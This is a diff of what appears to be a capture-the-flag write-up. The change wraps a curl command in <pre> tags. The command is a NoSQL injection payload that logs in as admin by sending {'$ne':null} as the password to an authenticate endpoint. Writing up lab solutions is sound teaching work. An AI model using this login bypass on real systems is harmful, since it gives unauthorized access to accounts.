@@ -53,7 +53,7 @@ And like that we got our flag!
 
 You can also solve it by using CURL instead of zap/burp.
 
-curl -X POST http://18.212.136.134:5200/api/authenticate -H "Content-Type: Application/json" -d '{"username":"admin", "password":{"$ne":null},"remember":"false"}'
+<pre>curl -X POST http://18.212.136.134:5200/api/authenticate -H "Content-Type: Application/json" -d '{"username":"admin", "password":{"$ne":null},"remember":"false"}' </pre>
 
 <img width="1421" height="480" alt="image" src="https://github.com/user-attachments/assets/06868a28-4cf3-471d-81e5-0397d5ec3b8e" />
 
